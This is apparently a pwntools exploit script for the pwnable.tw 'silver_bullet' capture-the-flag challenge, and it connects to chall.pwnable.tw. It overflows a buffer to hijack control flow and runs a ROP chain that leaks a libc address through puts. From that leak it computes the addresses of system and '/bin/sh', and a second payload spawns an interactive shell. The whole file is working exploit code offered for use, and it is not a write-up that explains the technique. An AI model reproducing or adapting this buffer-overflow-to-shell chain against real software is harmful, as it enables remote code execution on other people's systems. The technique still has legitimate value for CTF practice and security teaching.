from pwn import *
import time
#s=process("./silver_bullet",env={"LD_PRELOAD":"./libc_32.so.6"})
s=remote("chall.pwnable.tw", 10103)
pause()
print(s.recv(1024))
s.send("1\n")
print(s.recv(1024))
s.send("a"*0x2f+"\n")
print(s.recv(1024))
s.send("2\n")
print(s.recv(1024))
s.send("b\n")
print(s.recv(1024))
s.send("2\n")
print(s.recv(1024))
payload="\xff\xff\xff"+p32(0x0804b310)#p32(0x0804b210-0x1b0-4)
payload+=p32(0x08048a0a)+p32(0x0804affc)
s.send(payload+"\n")
print(s.recv(1024))
s.send("3\n")
print(s.recv(1024))
#s.recv(1024)
#print(hexdump(leak))
leak=s.recv(1024)
#leak=s.recv(1024)
#leak=s.recv(1024)
print(hexdump(leak))

leak=s.recv(1024)
print(hexdump(leak))

leak=s.recv(1024)
print(hexdump(leak))
libc_leak=u32(leak[1:5])
system=libc_leak-0xb7eae860+0xb7e5b940
sh=libc_leak-0xb7eae860+0xb7f79e8b
print(hex(system))
print(hex(sh))
s.send("1\n")
leak=s.recv(1024)
#libc_leak=u32(leak[0x10:0x14])
#system=libc_leak-0xb7e7e6b0+0xb7e43da0
#sh=libc_leak-0xb7e7e6b0+0xb7f64a0b
#print(hex(system))
#print(hex(sh))
#payload2="\xff\xff\xff"+p32(0xdeadbeef)
#payload2+=p32(system)+p32(sh)
s.send("c"*0x2f+"\n")
time.sleep(10)
print("HEHE")
print("HELLO1")
print(s.recv(1024))
s.send("2\n")
time.sleep(5)
print("HELLO2")
print(s.recv(1024))
s.send("d\n")
time.sleep(1)
print("HELLO3")
print(s.recv(1024))
time.sleep(10)
s.send("2\n")
time.sleep(1)
print("HELLO4")
payload2="aaa"+p32(0xdeadbeef)
payload2+=p32(system)+p32(0xdeadbeef)+p32(sh)
s.send(payload2+"e"*4+"f"*4+"g"*4+"h"*4+"i"*4+"j"*4+"\n")
time.sleep(5)
print("HELLO5")
print(s.recv(1024))
s.send("3\n")
print(s.recv(1024))
print(s.recv(1024))
s.interactive()
s.close()
